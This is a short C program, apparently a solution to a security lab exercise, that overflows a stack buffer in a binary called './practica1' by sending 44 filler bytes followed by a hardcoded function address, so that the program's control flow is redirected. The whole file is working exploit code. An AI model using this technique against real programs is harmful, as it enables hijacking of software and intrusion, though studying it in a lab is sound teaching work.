#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main() {
    const int offset = 44;
    const unsigned int func_addr = 0x565561d9;
    char payload[offset + sizeof(func_addr) + 1];
    memset(payload, 'A', offset);
    memcpy(payload + offset, &func_addr, sizeof(func_addr));
    payload[offset + sizeof(func_addr)] = '\0';
    char *argv[] = {"./practica1", payload, NULL};
    execve(argv[0], argv, NULL);
    perror("execve");
    return 1;
}
